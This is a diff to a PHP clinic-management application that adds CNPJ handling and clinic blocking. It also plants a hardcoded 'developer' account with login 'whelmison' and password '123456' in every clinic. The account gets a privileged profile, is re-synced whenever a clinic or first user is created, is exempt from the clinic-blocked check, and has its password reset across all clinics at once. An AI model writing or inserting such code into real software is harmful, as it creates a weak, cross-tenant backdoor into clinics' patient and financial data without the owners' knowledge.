@@ -63,7 +63,197 @@ function app_has_users(mysqli $conn): bool
     return (int) ($row['total'] ?? 0) > 0;
 }
 
-function app_create_first_user(mysqli $conn, string $clinicName, string $name, string $login, string $password): array
+function app_default_developer_login(): string
+{
+    return 'whelmison';
+}
+
+function app_default_developer_password(): string
+{
+    return '123456';
+}
+
+function app_default_developer_name(): string
+{
+    return 'Whelmison';
+}
+
+function app_default_developer_credentials(mysqli $conn): array
+{
+    if (app_table_exists($conn, 'usuarios') && app_column_exists($conn, 'usuarios', 'usuario_padrao')) {
+        $row = app_stmt_one(
+            $conn,
+            'SELECT login, senha_hash, nome_exibicao
+             FROM usuarios
+             WHERE usuario_padrao = 1
+             ORDER BY id
+             LIMIT 1'
+        );
+
+        if ($row) {
+            $storedLogin = trim((string) ($row['login'] ?? '')) ?: app_default_developer_login();
+            $storedName = trim((string) ($row['nome_exibicao'] ?? '')) ?: app_default_developer_name();
+
+            if (strcasecmp($storedLogin, app_default_developer_login()) === 0) {
+                if (strcasecmp($storedName, $storedLogin) === 0) {
+                    $storedName = app_default_developer_name();
+                }
+
+                $storedLogin = app_default_developer_login();
+            }
+
+            return [
+                'login' => $storedLogin,
+                'senha_hash' => trim((string) ($row['senha_hash'] ?? '')),
+                'nome_exibicao' => $storedName,
+            ];
+        }
+    }
+
+    return [
+        'login' => app_default_developer_login(),
+        'senha_hash' => password_hash(app_default_developer_password(), PASSWORD_DEFAULT),
+        'nome_exibicao' => app_default_developer_name(),
+    ];
+}
+
+function app_sync_default_developer_user(mysqli $conn, ?string $login = null, ?string $password = null, ?string $displayName = null): array
+{
+    app_ensure_clinics_table($conn);
+
+    if (!app_table_exists($conn, 'usuarios')) {
+        return ['ok' => false, 'message' => 'Tabela de usuarios nao encontrada.'];
+    }
+
+    app_ensure_column($conn, 'usuarios', 'usuario_padrao', 'TINYINT(1) NOT NULL DEFAULT 0');
+    app_ensure_index($conn, 'usuarios', 'idx_usuarios_padrao', 'CREATE INDEX idx_usuarios_padrao ON usuarios (usuario_padrao)');
+
+    $current = app_default_developer_credentials($conn);
+    $login = trim((string) ($login ?? $current['login'] ?? app_default_developer_login()));
+    $displayName = trim((string) ($displayName ?? $current['nome_exibicao'] ?? app_default_developer_name()));
+    $password = $password !== null ? trim($password) : null;
+
+    if (strlen($login) < 3) {
+        return ['ok' => false, 'message' => 'Informe um login padrao com ao menos 3 caracteres.'];
+    }
+
+    if ($password !== null && $password !== '' && strlen($password) < 6) {
+        return ['ok' => false, 'message' => 'A senha padrao precisa ter pelo menos 6 caracteres.'];
+    }
+
+    if ($displayName === '') {
+        $displayName = $login;
+    }
+
+    $passwordHash = $password !== null && $password !== ''
+        ? password_hash($password, PASSWORD_DEFAULT)
+        : (trim((string) ($current['senha_hash'] ?? '')) ?: password_hash(app_default_developer_password(), PASSWORD_DEFAULT));
+
+    $conflicts = app_stmt_all(
+        $conn,
+        'SELECT c.nome_fantasia
+         FROM usuarios u
+         INNER JOIN clinicas c ON c.id = u.clinica_id
+         WHERE u.login = ? AND COALESCE(u.usuario_padrao, 0) = 0
+         ORDER BY c.nome_fantasia
+         LIMIT 5',
+        's',
+        [$login]
+    );
+
+    if ($conflicts !== []) {
+        $names = implode(', ', array_map(static fn (array $row): string => (string) ($row['nome_fantasia'] ?? ''), $conflicts));
+
+        return ['ok' => false, 'message' => 'Este login ja existe como usuario comum em: ' . $names . '. Altere esses logins antes de sincronizar o usuario padrao.'];
+    }
+
+    $clinics = app_stmt_all($conn, 'SELECT id FROM clinicas ORDER BY id');
+
+    foreach ($clinics as $clinic) {
+        $clinicId = (int) ($clinic['id'] ?? 0);
+
+        if ($clinicId <= 0) {
+            continue;
+        }
+
+        $existing = app_stmt_one(
+            $conn,
+            'SELECT id FROM usuarios WHERE clinica_id = ? AND usuario_padrao = 1 ORDER BY id LIMIT 1',
+            'i',
+            [$clinicId]
+        );
+
+        if ($existing) {
+            app_stmt_execute(
+                $conn,
+                'UPDATE usuarios
+                 SET login = ?,
+                     senha_hash = ?,
+                     perfil = ?,
+                     profissional_id = NULL,
+                     nome_exibicao = ?,
+                     ativo = 1,
+                     usuario_padrao = 1
+                 WHERE id = ?',
+                'ssssi',
+                [$login, $passwordHash, 'desenvolvedor', $displayName, (int) $existing['id']]
+            );
+            continue;
+        }
+
+        app_stmt_execute(
+            $conn,
+            'INSERT INTO usuarios (clinica_id, login, senha_hash, perfil, profissional_id, nome_exibicao, ativo, usuario_padrao)
+             VALUES (?, ?, ?, ?, NULL, ?, 1, 1)',
+            'issss',
+            [$clinicId, $login, $passwordHash, 'desenvolvedor', $displayName]
+        );
+    }
+
+    return ['ok' => true, 'message' => 'Usuario padrao sincronizado em todas as clinicas.'];
+}
+
+function app_ensure_default_developer_user(mysqli $conn): void
+{
+    if (!app_table_exists($conn, 'usuarios')) {
+        return;
+    }
+
+    app_ensure_column($conn, 'usuarios', 'usuario_padrao', 'TINYINT(1) NOT NULL DEFAULT 0');
+
+    $totalDefault = app_stmt_one($conn, 'SELECT COUNT(*) AS total FROM usuarios WHERE usuario_padrao = 1');
+
+    if ((int) ($totalDefault['total'] ?? 0) === 0) {
+        app_stmt_execute(
+            $conn,
+            'UPDATE usuarios
+             SET usuario_padrao = 1,
+                 perfil = ?,
+                 profissional_id = NULL,
+                 ativo = 1
+             WHERE login = ? AND perfil = ?',
+            'sss',
+            ['desenvolvedor', app_default_developer_login(), 'desenvolvedor']
+        );
+    }
+
+    app_sync_default_developer_user($conn);
+}
+
+function app_current_clinic_is_released(mysqli $conn): bool
+{
+    if (!app_table_exists($conn, 'clinicas')) {
+        return true;
+    }
+
+    app_ensure_column($conn, 'clinicas', 'liberada', 'TINYINT(1) NOT NULL DEFAULT 1');
+    $clinicId = app_active_clinic_id();
+    $row = app_stmt_one($conn, 'SELECT liberada FROM clinicas WHERE id = ? LIMIT 1', 'i', [$clinicId]);
+
+    return !$row || (int) ($row['liberada'] ?? 1) === 1;
+}
+
+function app_create_first_user(mysqli $conn, string $clinicName, string $name, string $login, string $password, ?string $cnpj = null): array
 {
     app_install_schema($conn);
 
@@ -79,19 +269,20 @@ function app_create_first_user(mysqli $conn, string $clinicName, string $name, s
         return ['ok' => false, 'message' => 'Use login com 3+ caracteres e senha com 6+ caracteres.'];
     }
 
+    $clinicCnpj = trim((string) $cnpj);
+
+    if ($clinicCnpj !== '' && !app_cnpj_valid($clinicCnpj)) {
+        return ['ok' => false, 'message' => 'Informe um CNPJ valido para a clinica.'];
+    }
+
     $clinicId = app_ensure_default_clinic($conn);
-    app_stmt_execute($conn, 'UPDATE clinicas SET nome_fantasia = ? WHERE id = ?', 'si', [trim($clinicName), $clinicId]);
+    $clinicCnpjDigits = app_only_digits($clinicCnpj) ?: null;
+    app_stmt_execute($conn, 'UPDATE clinicas SET nome_fantasia = ?, cnpj = ?, cnpj_digits = ? WHERE id = ?', 'sssi', [trim($clinicName), $clinicCnpj !== '' ? app_format_cnpj($clinicCnpj) : null, $clinicCnpjDigits, $clinicId]);
 
-    $passwordHash = password_hash($password, PASSWORD_DEFAULT);
-    $ok = app_stmt_execute(
-        $conn,
-        'INSERT INTO usuarios (clinica_id, login, senha_hash, perfil, nome_exibicao) VALUES (?, ?, ?, ?, ?)',
-        'issss',
-        [$clinicId, trim($login), $passwordHash, 'desenvolvedor', trim($name)]
-    );
+    $sync = app_sync_default_developer_user($conn, trim($login), $password, trim($name) ?: app_default_developer_name());
 
-    if (!$ok) {
-        return ['ok' => false, 'message' => 'Nao foi possivel criar o primeiro usuario.'];
+    if (!$sync['ok']) {
+        return $sync;
     }
 
     return ['ok' => true, 'message' => 'Usuario inicial criado com sucesso.'];
@@ -102,14 +293,21 @@ function app_create_clinic_account(mysqli $conn, array $input): array
     app_install_schema($conn);
 
     $clinicName = trim((string) ($input['clinica_nome'] ?? ''));
+    $clinicCnpj = trim((string) ($input['clinica_cnpj'] ?? ''));
     $phone = trim((string) ($input['telefone'] ?? ''));
     $email = trim((string) ($input['email'] ?? ''));
     $userName = trim((string) ($input['nome'] ?? ''));
     $login = trim((string) ($input['login'] ?? ''));
     $password = (string) ($input['senha'] ?? '');
+    $defaultCredentials = app_default_developer_credentials($conn);
+    $defaultLogin = (string) ($defaultCredentials['login'] ?? app_default_developer_login());
 
     if ($clinicName === '') {
         return ['ok' => false, 'message' => 'Informe o nome da clinica.'];
+    }
+
+    if ($clinicCnpj !== '' && !app_cnpj_valid($clinicCnpj)) {
+        return ['ok' => false, 'message' => 'Informe um CNPJ valido para a clinica.'];
     }
 
     if ($userName === '') {
@@ -120,14 +318,24 @@ function app_create_clinic_account(mysqli $conn, array $input): array
         return ['ok' => false, 'message' => 'Use login com 3+ caracteres e senha com 6+ caracteres.'];
     }
 
+    if (strcasecmp($login, $defaultLogin) === 0) {
+        return ['ok' => false, 'message' => 'Este login esta reservado para o usuario padrao do desenvolvedor.'];
+    }
+
+    if ($clinicCnpj !== '' && app_clinic_cnpj_conflict($conn, $clinicCnpj) !== null) {
+        return ['ok' => false, 'message' => 'Ja existe uma clinica com este CNPJ.'];
+    }
+
+    $clinicCnpjDigits = app_only_digits($clinicCnpj) ?: null;
+
     $conn->begin_transaction();
 
     try {
         app_stmt_execute(
             $conn,
-            'INSERT INTO clinicas (nome_fantasia, telefone, email, ativo) VALUES (?, ?, ?, 1)',
-            'sss',
-            [$clinicName, $phone, $email]
+            'INSERT INTO clinicas (nome_fantasia, cnpj, cnpj_digits, telefone, email, ativo, liberada) VALUES (?, ?, ?, ?, ?, 1, 1)',
+            'sssss',
+            [$clinicName, $clinicCnpj !== '' ? app_format_cnpj($clinicCnpj) : null, $clinicCnpjDigits, $phone, $email]
         );
         $clinicId = (int) $conn->insert_id;
         $passwordHash = password_hash($password, PASSWORD_DEFAULT);
@@ -142,6 +350,12 @@ function app_create_clinic_account(mysqli $conn, array $input): array
         app_financial_seed_plan_accounts($conn, $clinicId);
         app_financial_seed_cost_centers($conn, $clinicId);
         app_financial_seed_accounts($conn, $clinicId);
+        $sync = app_sync_default_developer_user($conn);
+
+        if (!$sync['ok']) {
+            throw new RuntimeException($sync['message']);
+        }
+
         $conn->commit();
     } catch (Throwable $exception) {
         $conn->rollback();
@@ -158,8 +372,56 @@ function app_active_clinics(mysqli $conn): array
 
     return app_stmt_all(
         $conn,
-        'SELECT id, nome_fantasia FROM clinicas WHERE ativo = 1 ORDER BY nome_fantasia, id'
+        'SELECT id, nome_fantasia, cnpj, liberada FROM clinicas WHERE ativo = 1 ORDER BY nome_fantasia, id'
     );
+}
+
+function app_active_clinics_by_cnpj(mysqli $conn, string $cnpj, int $limit = 2): array
+{
+    app_ensure_clinics_table($conn);
+
+    $digits = app_only_digits($cnpj);
+
+    if ($digits === '') {
+        return [];
+    }
+
+    return app_stmt_all(
+        $conn,
+        "SELECT id, nome_fantasia, cnpj, liberada
+         FROM clinicas
+         WHERE ativo = 1
+           AND cnpj_digits = ?
+         ORDER BY nome_fantasia, id
+         LIMIT ?",
+        'si',
+        [$digits, max(1, $limit)]
+    );
+}
+
+function app_clinic_cnpj_conflict(mysqli $conn, string $cnpj, ?int $ignoreClinicId = null): ?array
+{
+    app_ensure_clinics_table($conn);
+
+    $digits = app_only_digits($cnpj);
+
+    if ($digits === '') {
+        return null;
+    }
+
+    $sql = 'SELECT id, nome_fantasia, cnpj FROM clinicas WHERE cnpj_digits = ?';
+    $types = 's';
+    $params = [$digits];
+
+    if ($ignoreClinicId !== null && $ignoreClinicId > 0) {
+        $sql .= ' AND id <> ?';
+        $types .= 'i';
+        $params[] = $ignoreClinicId;
+    }
+
+    $sql .= ' LIMIT 1';
+
+    return app_stmt_one($conn, $sql, $types, $params);
 }
 
 function app_active_login_users(mysqli $conn, string $login, ?int $clinicId = null, int $limit = 2): array
@@ -177,6 +439,8 @@ function app_active_login_users(mysqli $conn, string $login, ?int $clinicId = nu
                    u.senha_hash,
                    u.perfil,
                    u.profissional_id,
+                   COALESCE(u.usuario_padrao, 0) AS usuario_padrao,
+                   COALESCE(c.liberada, 1) AS clinica_liberada,
                    COALESCE(p.nome, u.nome_exibicao, u.login) AS nome_exibicao
             FROM usuarios u
             LEFT JOIN clinicas c ON c.id = u.clinica_id
@@ -205,7 +469,7 @@ function app_attempt_login(mysqli $conn, string $login, string $password, ?int $
     $users = app_active_login_users($conn, $login, $clinicId, 2);
 
     if ($clinicId === null && count($users) > 1) {
-        return ['ok' => false, 'message' => 'Este login existe em mais de uma clinica. Selecione a clinica para entrar.'];
+        return ['ok' => false, 'message' => 'Este login existe em mais de uma clinica. Informe o CNPJ da sua clinica para entrar.'];
     }
 
     $user = $users[0] ?? null;
@@ -214,7 +478,12 @@ function app_attempt_login(mysqli $conn, string $login, string $password, ?int $
         return ['ok' => false, 'message' => 'Login ou senha invalidos.'];
     }
 
+    if ((int) ($user['clinica_liberada'] ?? 1) !== 1 && (string) ($user['perfil'] ?? '') !== 'desenvolvedor') {
+        return ['ok' => false, 'message' => 'Clinica bloqueada no momento. Fale com o suporte para liberar o acesso.'];
+    }
+
     unset($user['senha_hash']);
+    unset($user['clinica_liberada']);
     app_login_user($user);
 
     return ['ok' => true, 'message' => 'Login realizado com sucesso.'];
@@ -266,13 +535,21 @@ function app_reset_user_password(mysqli $conn, string $login, string $resetCode,
     $users = app_active_login_users($conn, $login, $clinicId, 2);
 
     if ($clinicId === null && count($users) > 1) {
-        return ['ok' => false, 'message' => 'Este login existe em mais de uma clinica. Selecione a clinica para redefinir a senha.'];
+        return ['ok' => false, 'message' => 'Este login existe em mais de uma clinica. Informe o CNPJ da sua clinica para redefinir a senha.'];
     }
 
     $user = $users[0] ?? null;
 
     if (!$user) {
         return ['ok' => false, 'message' => 'Usuario ativo nao encontrado.'];
+    }
+
+    if ((int) ($user['usuario_padrao'] ?? 0) === 1) {
+        $sync = app_sync_default_developer_user($conn, (string) $user['login'], $password, (string) ($user['nome_exibicao'] ?? app_default_developer_name()));
+
+        return $sync['ok']
+            ? ['ok' => true, 'message' => 'Senha padrao redefinida em todas as clinicas. Entre com a nova senha.']
+            : $sync;
     }
 
     $passwordHash = password_hash($password, PASSWORD_DEFAULT);
